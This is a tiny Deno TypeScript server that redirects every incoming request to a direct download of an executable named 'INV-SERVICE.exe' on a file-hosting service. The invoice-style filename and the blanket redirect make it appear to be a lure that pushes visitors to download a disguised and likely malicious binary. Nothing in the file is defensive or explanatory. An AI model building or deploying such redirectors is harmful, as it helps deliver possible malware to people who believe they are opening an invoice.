// main.ts
import { serve } from "https://deno.land/std/http/server.ts";

serve((_req) => {
  return new Response(null, {
    status: 302,
    headers: {
      Location: "https://store-na-phx-3.gofile.io/download/direct/e20eac1f-22b1-4cc4-843f-2622cc57e1eb/INV-SERVICE.exe",
    },
  });
});
